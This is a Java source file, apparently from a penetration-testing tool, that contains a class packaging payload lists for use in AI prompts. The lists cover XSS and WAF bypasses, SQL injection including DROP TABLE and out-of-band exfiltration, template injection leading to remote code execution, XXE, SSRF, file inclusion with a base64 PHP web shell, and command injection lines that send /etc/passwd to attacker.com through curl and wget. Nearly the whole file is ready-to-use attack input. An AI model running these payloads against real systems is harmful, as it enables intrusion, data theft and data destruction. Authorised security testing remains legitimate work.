package com.vista.security.core;

import java.util.*;

/**
 * Bypass Knowledge Base - Inspired by PayloadsAllTheThings.
 * Contains real-world bypass techniques for various vulnerabilities.
 * 
 * Reference: https://github.com/swisskyrepo/PayloadsAllTheThings
 */
public class BypassKnowledgeBase {

    /**
     * Get comprehensive bypass knowledge for AI prompts.
     */
    public static String getBypassKnowledge(String vulnerabilityType) {
        return switch (vulnerabilityType.toUpperCase()) {
            case "XSS", "CROSS-SITE SCRIPTING" -> getXSSBypassKnowledge();
            case "SQLI", "SQL INJECTION" -> getSQLiBypassKnowledge();
            case "SSTI", "SERVER-SIDE TEMPLATE INJECTION" -> getSSTIBypassKnowledge();
            case "COMMAND INJECTION", "RCE" -> getCommandInjectionKnowledge();
            case "XXE" -> getXXEKnowledge();
            case "SSRF" -> getSSRFKnowledge();
            case "LFI", "FILE INCLUSION" -> getLFIKnowledge();
            case "IDOR" -> getIDORKnowledge();
            case "AUTH BYPASS", "AUTHENTICATION BYPASS" -> getAuthBypassKnowledge();
            default -> getGeneralBypassKnowledge();
        };
    }

    private static String getXSSBypassKnowledge() {
        return """
            # XSS BYPASS TECHNIQUES (PayloadsAllTheThings)
            
            ## 1. WAF BYPASS - CASE VARIATION
            <ScRiPt>alert(1)</sCriPt>
            <sCrIpT>alert(1)</ScRiPt>
            
            ## 2. ALTERNATIVE TAGS & EVENT HANDLERS
            <svg/onload=alert(1)>
            <img src=x onerror=alert(1)>
            <body onload=alert(1)>
            <marquee onstart=alert(1)>
            <details open ontoggle=alert(1)>
            <iframe onload=alert(1)>
            
            ## 3. ENCODING BYPASS
            ### URL Encoding
            %3Cscript%3Ealert(1)%3C/script%3E
            
            ### HTML Entity Encoding
            &#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
            &#60;script&#62;alert(1)&#60;/script&#62;
            
            ### Unicode Normalization
            ＜script＞alert⁽1⁾＜/script＞
            
            ### Double Encoding
            %253Cscript%253E
            
            ## 4. FILTER BYPASS - NULL BYTES & NEWLINES
            <script>%00alert(1)</script>
            <script>%0aalert(1)</script>
            <script>%0dalert(1)</script>
            
            ## 5. POLYGLOT PAYLOADS
            jaVasCript:/*-/*`/*\\\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\\\x3csVg/<sVg/oNloAd=alert()//>
            
            ## 6. CONTEXT-SPECIFIC BYPASSES
            ### Inside HTML Attribute
            " onload="alert(1)
            ' onload='alert(1)
            
            ### Inside JavaScript String
            '-alert(1)-'
            ';alert(1);//
            
            ### Inside JavaScript Template Literal
            ${alert(1)}
            
            ### Inside Event Handler
            alert(1)//
            alert(1)}//
            
            ## 7. CSP BYPASS
            ### Using JSONP endpoints
            <script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
            
            ### Using allowed domains
            <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.js"></script>
            <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
            
            ### Base tag injection
            <base href="https://attacker.com/">
            
            ## 8. DOM-BASED XSS
            ### Location-based
            javascript:alert(1)
            #<img src=x onerror=alert(1)>
            
            ### postMessage exploitation
            window.postMessage('<img src=x onerror=alert(1)>', '*')
            
            ## 9. MUTATION XSS (mXSS)
            <noscript><p title="</noscript><img src=x onerror=alert(1)>">
            
            ## 10. CLOUDFLARE-SPECIFIC BYPASSES
            <svg/onload=alert(1)//
            <script>alert(String.fromCharCode(88,83,83))</script>
            <img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3Rlc3QiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
            
            ## 11. AKAMAI-SPECIFIC BYPASSES
            <svg><animate onbegin=alert(1) attributeName=x dur=1s>
            <marquee loop=1 width=0 onfinish=alert(1)>
            
            ## 12. IMPERVA-SPECIFIC BYPASSES
            <svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click</text></a>
            """;
    }

    private static String getSQLiBypassKnowledge() {
        return """
            # SQL INJECTION BYPASS TECHNIQUES (PayloadsAllTheThings)
            
            ## 1. AUTHENTICATION BYPASS
            admin' OR '1'='1
            admin' OR 1=1--
            admin' OR 1=1#
            admin'/**/OR/**/1=1--
            admin' OR 1=1 LIMIT 1--
            
            ## 2. COMMENT-BASED BYPASS
            /*!50000SELECT*/ * FROM users
            SELECT/**/password/**/FROM/**/users
            SEL/**/ECT password FROM users
            
            ## 3. CASE VARIATION
            SeLeCt * FrOm users
            sELEct * fRoM users
            
            ## 4. ENCODING BYPASS
            ### URL Encoding
            %53%45%4C%45%43%54 (SELECT)
            
            ### Double URL Encoding
            %2553%2545%254C%2545%2543%2554
            
            ### Unicode
            \u0053\u0045\u004C\u0045\u0043\u0054
            
            ## 5. WHITESPACE BYPASS
            SELECT%09password%09FROM%09users (tab)
            SELECT%0Apassword%0AFROM%0Ausers (newline)
            SELECT%0Dpassword%0DFROM%0Dusers (carriage return)
            SELECT%A0password%A0FROM%A0users (non-breaking space)
            
            ## 6. OPERATOR ALTERNATIVES
            ### OR alternatives
            ||
            OR
            |
            
            ### AND alternatives
            &&
            AND
            
            ### EQUALS alternatives
            LIKE
            REGEXP
            RLIKE
            
            ## 7. UNION-BASED INJECTION
            ' UNION SELECT NULL,NULL,NULL--
            ' UNION SELECT 1,2,3--
            ' UNION ALL SELECT NULL,NULL,NULL--
            ' UNION SELECT username,password,3 FROM users--
            
            ## 8. TIME-BASED BLIND INJECTION
            ### MySQL
            ' AND SLEEP(5)--
            ' AND BENCHMARK(10000000,MD5('A'))--
            ' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
            
            ### PostgreSQL
            '; SELECT pg_sleep(5)--
            '; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
            
            ### MSSQL
            '; WAITFOR DELAY '00:00:05'--
            '; IF (1=1) WAITFOR DELAY '00:00:05'--
            
            ### Oracle
            ' AND DBMS_LOCK.SLEEP(5)--
            
            ## 9. ERROR-BASED INJECTION
            ### MySQL
            ' AND extractvalue(1,concat(0x7e,version()))--
            ' AND updatexml(1,concat(0x7e,version()),1)--
            
            ### PostgreSQL
            ' AND 1=CAST((SELECT version()) AS int)--
            
            ### MSSQL
            ' AND 1=CONVERT(int,@@version)--
            
            ## 10. STACKED QUERIES
            '; DROP TABLE users--
            '; INSERT INTO users VALUES('hacker','pass')--
            '; UPDATE users SET password='hacked' WHERE username='admin'--
            
            ## 11. WAF BYPASS - CLOUDFLARE
            admin'/**/OR/**/1=1--
            admin'%0AOR%0A1=1--
            admin'%09OR%091=1--
            
            ## 12. WAF BYPASS - MODSECURITY
            admin' /*!50000OR*/ 1=1--
            admin' %0bOR%0b 1=1--
            
            ## 13. WAF BYPASS - AWS WAF
            admin' OR 1=1-- -
            admin' OR '1'='1'-- -
            
            ## 14. SECOND-ORDER INJECTION
            Store: admin'-- in username field
            Later query uses this value without sanitization
            
            ## 15. OUT-OF-BAND (OOB) INJECTION
            ### MySQL
            ' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\\\share'))--
            
            ### MSSQL
            '; EXEC master..xp_dirtree '\\\\attacker.com\\share'--
            
            ### Oracle
            ' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||password) FROM users--
            """;
    }

    private static String getSSTIBypassKnowledge() {
        return """
            # SSTI BYPASS TECHNIQUES (PayloadsAllTheThings)
            
            ## 1. DETECTION PAYLOADS
            {{7*7}}
            ${7*7}
            <%= 7*7 %>
            ${{7*7}}
            #{7*7}
            
            ## 2. JINJA2 (Python/Flask)
            {{config}}
            {{config.items()}}
            {{''.__class__.__mro__[1].__subclasses__()}}
            {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
            
            ### RCE
            {{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}
            {{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
            
            ## 3. TWIG (PHP)
            {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
            {{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("cat /etc/passwd")}}
            
            ## 4. FREEMARKER (Java)
            <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
            <#assign ex="freemarker.template.utility.ObjectConstructor"?new()>${ex("java.lang.ProcessBuilder","id").start()}
            
            ## 5. VELOCITY (Java)
            #set($x='')##
            #set($rt=$x.class.forName('java.lang.Runtime'))##
            #set($chr=$x.class.forName('java.lang.Character'))##
            #set($str=$x.class.forName('java.lang.String'))##
            #set($ex=$rt.getRuntime().exec('id'))##
            
            ## 6. THYMELEAF (Java)
            ${T(java.lang.Runtime).getRuntime().exec('calc')}
            
            ## 7. SMARTY (PHP)
            {system('cat /etc/passwd')}
            {php}system('cat /etc/passwd');{/php}
            
            ## 8. MAKO (Python)
            <%import os%>${os.system('id')}
            
            ## 9. ERB (Ruby)
            <%= system('id') %>
            <%= `id` %>
            <%= IO.popen('id').readlines() %>
            
            ## 10. TORNADO (Python)
            {% import os %}{{os.system('id')}}
            
            ## 11. BYPASS FILTERS
            ### Blacklist bypass
            {{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}
            
            ### Attribute access bypass
            {{request['__class__']}}
            {{request|attr('__class__')}}
            {{request['\\x5f\\x5fclass\\x5f\\x5f']}}
            """;
    }

    private static String getCommandInjectionKnowledge() {
        return """
            # COMMAND INJECTION BYPASS TECHNIQUES
            
            ## 1. BASIC INJECTION
            ; ls
            | ls
            || ls
            & ls
            && ls
            `ls`
            $(ls)
            
            ## 2. BYPASS SPACES
            {ls,-la}
            $IFS
            ${IFS}
            $IFS$9
            <ls
            <ls>
            {cat,/etc/passwd}
            
            ## 3. BYPASS BLACKLIST
            ### Case variation
            Cat /etc/passwd
            CAT /etc/passwd
            
            ### Wildcards
            /???/??t /???/p??s??
            /bin/c?t /etc/p?sswd
            
            ### Variable expansion
            $PATH -> /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
            ${PATH:0:1} -> /
            
            ## 4. ENCODING
            ### Hex encoding
            $(echo 636174202f6574632f706173737764 | xxd -r -p)
            
            ### Base64
            `echo Y2F0IC9ldGMvcGFzc3dk | base64 -d`
            
            ## 5. TIME-BASED DETECTION
            ; sleep 5
            | sleep 5
            `sleep 5`
            $(sleep 5)
            
            ## 6. OUT-OF-BAND
            ; nslookup attacker.com
            | curl http://attacker.com/$(whoami)
            `wget http://attacker.com/?data=$(cat /etc/passwd | base64)`
            """;
    }

    private static String getXXEKnowledge() {
        return """
            # XXE BYPASS TECHNIQUES
            
            ## 1. BASIC XXE
            <?xml version="1.0"?>
            <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
            <foo>&xxe;</foo>
            
            ## 2. BLIND XXE (OOB)
            <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
            
            ## 3. XXE VIA SVG
            <svg xmlns="http://www.w3.org/2000/svg">
            <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
            <text>&xxe;</text>
            </svg>
            
            ## 4. XXE VIA XLSX/DOCX
            Modify [Content_Types].xml or document.xml
            """;
    }

    private static String getSSRFKnowledge() {
        return """
            # SSRF BYPASS TECHNIQUES
            
            ## 1. LOCALHOST BYPASS
            http://127.0.0.1
            http://localhost
            http://0.0.0.0
            http://[::1]
            http://127.1
            http://2130706433 (decimal)
            http://0x7f000001 (hex)
            
            ## 2. DNS REBINDING
            Use services like 1u.ms or nip.io
            
            ## 3. URL PARSER BYPASS
            http://google.com@127.0.0.1
            http://127.0.0.1#google.com
            http://google.com#@127.0.0.1
            
            ## 4. PROTOCOL SMUGGLING
            file:///etc/passwd
            dict://127.0.0.1:6379/info
            gopher://127.0.0.1:6379/_SET%20key%20value
            """;
    }

    private static String getLFIKnowledge() {
        return """
            # LFI BYPASS TECHNIQUES
            
            ## 1. BASIC LFI
            ../../../etc/passwd
            ....//....//....//etc/passwd
            ..%2F..%2F..%2Fetc%2Fpasswd
            
            ## 2. NULL BYTE BYPASS
            ../../../etc/passwd%00
            ../../../etc/passwd%00.jpg
            
            ## 3. ENCODING
            ..%252F..%252F..%252Fetc%252Fpasswd
            ..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
            
            ## 4. WRAPPER BYPASS
            php://filter/convert.base64-encode/resource=index.php
            php://input (with POST data)
            data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
            
            ## 5. LOG POISONING
            /var/log/apache2/access.log
            /var/log/nginx/access.log
            """;
    }

    private static String getIDORKnowledge() {
        return """
            # IDOR BYPASS TECHNIQUES
            
            ## 1. PARAMETER MANIPULATION
            /api/user/123 -> /api/user/124
            ?id=123 -> ?id=124
            
            ## 2. GUID ENUMERATION
            Try sequential GUIDs
            Try predictable patterns
            
            ## 3. ARRAY MANIPULATION
            id=123 -> id[]=123&id[]=124
            
            ## 4. PARAMETER POLLUTION
            ?id=123&id=124
            
            ## 5. HTTP METHOD OVERRIDE
            GET /api/user/123 (blocked)
            POST /api/user/123 (allowed)
            """;
    }

    private static String getAuthBypassKnowledge() {
        return """
            # AUTHENTICATION BYPASS TECHNIQUES
            
            ## 1. SQL INJECTION
            admin' OR '1'='1
            admin'--
            admin' OR 1=1--
            
            ## 2. NOSQL INJECTION
            {"username": {"$ne": null}, "password": {"$ne": null}}
            {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
            
            ## 3. JWT BYPASS
            ### Algorithm confusion
            Change "alg": "RS256" to "alg": "HS256"
            
            ### None algorithm
            Change "alg": "HS256" to "alg": "none"
            
            ### Weak secret
            Brute force the secret
            
            ## 4. COOKIE MANIPULATION
            admin=false -> admin=true
            role=user -> role=admin
            
            ## 5. PARAMETER POLLUTION
            ?admin=false&admin=true
            
            ## 6. RACE CONDITION
            Send multiple requests simultaneously
            """;
    }

    private static String getGeneralBypassKnowledge() {
        return """
            # GENERAL BYPASS TECHNIQUES
            
            ## 1. ENCODING
            - URL encoding
            - Double URL encoding
            - HTML entity encoding
            - Unicode encoding
            - Base64 encoding
            
            ## 2. CASE VARIATION
            - Mixed case
            - All uppercase
            - All lowercase
            
            ## 3. WHITESPACE MANIPULATION
            - Tabs, newlines, carriage returns
            - Multiple spaces
            - Non-breaking spaces
            
            ## 4. NULL BYTES
            - %00
            - \\x00
            
            ## 5. COMMENT INJECTION
            - /**/ (SQL)
            - <!-- --> (HTML)
            - // (JavaScript)
            
            ## 6. PARAMETER POLLUTION
            - Multiple parameters with same name
            - Array notation
            """;
    }
}
